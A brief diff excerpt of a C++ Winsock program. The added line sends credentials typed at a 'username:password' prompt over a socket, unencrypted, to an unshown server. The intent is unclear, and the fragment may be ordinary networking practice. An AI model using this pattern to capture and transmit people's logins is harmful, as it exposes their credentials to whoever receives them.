@@ -33,6 +33,7 @@ int main() {
    while (true){
       cout << "Enter credentials (username:password): ";
         cin.getline(buffer, sizeof(buffer));
+     sendto(clientSocket, buffer, strlen(buffer), 0, (struct sockaddr*)&serverAddress, sizeof(serverAddress));
     
     closesocket(clientSocket);
     WSACleanup();
